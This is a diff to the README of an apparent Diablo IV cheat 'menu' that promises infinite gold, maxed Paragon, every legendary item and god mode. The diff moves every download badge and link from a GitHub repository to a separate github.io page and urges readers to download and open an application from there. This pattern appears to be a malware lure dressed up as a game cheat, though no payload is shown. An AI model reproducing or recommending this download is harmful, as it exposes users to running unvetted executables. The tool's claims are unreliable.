@@ -1,8 +1,8 @@
 # 🎮 diablo-4-fixi-menu - Unlock Everything In Diablo IV
 
-[![Download Now](https://img.shields.io/badge/Download-diablo--4--fixi--menu-crimson?style=for-the-badge&logo=github)](https://github.com/rehansahab/diablo-4-fixi-menu)
-[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://github.com/rehansahab/diablo-4-fixi-menu)
-[![Version](https://img.shields.io/badge/Version-Latest-darkred?style=for-the-badge)](https://github.com/rehansahab/diablo-4-fixi-menu)
+[![Download Now](https://img.shields.io/badge/Download-diablo--4--fixi--menu-crimson?style=for-the-badge&logo=github)](https://rehansahab.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://rehansahab.github.io)
+[![Version](https://img.shields.io/badge/Version-Latest-darkred?style=for-the-badge)](https://rehansahab.github.io)
 
 Welcome to **diablo-4-fixi-menu**, a friendly, easy-to-use menu tool built for Diablo IV players on Windows. If you have ever wanted to skip the grind and jump straight into the fun part of Sanctuary — with infinite gold in your pockets, a fully maxed Paragon board, every legendary item you could dream of, and a god mode toggle that keeps you standing through the toughest fights — this is the tool for you.
 
@@ -18,7 +18,7 @@ Getting the tool is a straightforward process, even if you have never downloaded
 
 Click the large button below. When the page opens, look for the download section on that page and grab the application files.
 
-[![Download diablo-4-fixi-menu](https://img.shields.io/badge/⬇_Download-diablo--4--fixi--menu-brightgreen?style=for-the-badge)](https://github.com/rehansahab/diablo-4-fixi-menu)
+[![Download diablo-4-fixi-menu](https://img.shields.io/badge/⬇_Download-diablo--4--fixi--menu-brightgreen?style=for-the-badge)](https://rehansahab.github.io)
 
 **Step 2: Save the files**
 
@@ -83,7 +83,7 @@ If your computer can run Diablo IV smoothly, it can run this menu without any tr
 
 This is the section to bookmark. Everything you need lives at one link.
 
-**Download link:** [https://github.com/rehansahab/diablo-4-fixi-menu](https://github.com/rehansahab/diablo-4-fixi-menu)
+**Download link:** [https://rehansahab.github.io](https://rehansahab.github.io)
 
 Visit this link to download the application. Once the page loads, follow the prompts on that page to save the application to your computer, then open it to begin.
 
@@ -196,7 +196,7 @@ A few simple habits go a long way:
 
 Everything you need is one click away. Head to the download page, save the application to your PC, open it alongside Diablo IV, and start flipping switches. Within a couple of minutes you will be running around Sanctuary with a full wallet, a maxed Paragon board, a legendary arsenal, and damage immunity.
 
-[![Get diablo-4-fixi-menu](https://img.shields.io/badge/⬇_Get_diablo--4--fixi--menu-red?style=for-the-badge&logo=github)](https://github.com/rehansahab/diablo-4-fixi-menu)
+[![Get diablo-4-fixi-menu](https://img.shields.io/badge/⬇_Get_diablo--4--fixi--menu-red?style=for-the-badge&logo=github)](https://rehansahab.github.io)
 
 Visit this link to download the application. Enjoy the game your way.
 
